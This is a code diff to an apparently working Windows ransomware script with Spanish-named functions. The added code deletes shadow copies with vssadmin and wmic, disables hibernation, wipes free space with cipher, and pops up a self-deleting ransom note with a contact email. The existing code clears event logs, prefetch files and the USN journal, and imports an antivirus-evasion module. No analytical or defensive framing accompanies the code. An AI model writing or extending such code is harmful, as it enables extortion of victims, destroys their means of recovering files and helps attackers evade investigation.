@@ -3,6 +3,7 @@ import sys
 import time
 import threading
 import shutil
+import subprocess
 from concurrent.futures import ThreadPoolExecutor, as_completed
 
 if getattr(sys, 'frozen', False):
@@ -15,6 +16,17 @@ os.chdir(SCRIPT_DIR)
 
 def pre_cleanup():
     try:
+        subprocess.run(['vssadmin', 'delete', 'shadows', '/all', '/quiet'], capture_output=True, creationflags=0x08000000)
+        subprocess.run(['wmic', 'shadowcopy', 'delete'], capture_output=True, creationflags=0x08000000)
+        subprocess.run(['powercfg', '-h', 'off'], capture_output=True, creationflags=0x08000000)
+        subprocess.run([
+            'reg', 'add',
+            r'HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management',
+            '/v', 'ClearPageFileAtShutdown',
+            '/t', 'REG_DWORD',
+            '/d', '1',
+            '/f'
+        ], capture_output=True, creationflags=0x08000000)
         os.system('powershell -w h -nop -c "Remove-Item C:\\Windows\\Prefetch\\*.pf -Force" 2>nul')
         os.system('wevtutil cl Application 2>nul')
         os.system('wevtutil cl System 2>nul')
@@ -26,6 +38,8 @@ def pre_cleanup():
             if os.path.exists(drive):
                 os.system(f'fsutil usn deletejournal /D {drive} 2>nul')
         os.system('reg delete "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\AppCompatCache" /f 2>nul')
+        import ctypes
+        ctypes.windll.psapi.EmptyWorkingSet(-1)
     except:
         pass
 
@@ -72,6 +86,26 @@ def wipe_memory_aggressive():
         pass
 
 
+def mostrar_mensaje_final():
+    try:
+        vbs_content = """On Error Resume Next
+MsgBox "Your files have been encrypted. Contact: onder01@tutamail.com", vbCritical + vbSystemModal, "Encrypted"
+Dim fso, scriptPath
+Set fso = CreateObject("Scripting.FileSystemObject")
+scriptPath = WScript.ScriptFullName
+WScript.Sleep 3000
+On Error Resume Next
+fso.DeleteFile scriptPath, True
+WScript.Quit
+"""
+        vbs_path = os.path.join(os.environ.get('TEMP', ''), f'~{os.getpid()}.vbs')
+        with open(vbs_path, 'w', encoding='utf-8') as f:
+            f.write(vbs_content)
+        subprocess.Popen(['wscript.exe', vbs_path], creationflags=0x08000000, shell=False)
+    except:
+        pass
+
+
 try:
     from evasion_av import verificar_seguridad_total
 except:
@@ -90,7 +124,7 @@ def encriptar_archivo(enc, ruta):
         if result:
             try:
                 dirname = os.path.dirname(ruta)
-                os.system(f'cipher /w:"{dirname}" 2>nul')
+                subprocess.Popen(['cipher', '/w:' + dirname], creationflags=0x08000000)
             except:
                 pass
         return result
@@ -114,6 +148,7 @@ def main():
                     future.result()
                 except:
                     pass
+        mostrar_mensaje_final()
         wipe_memory_aggressive()
         pre_cleanup()
     except:
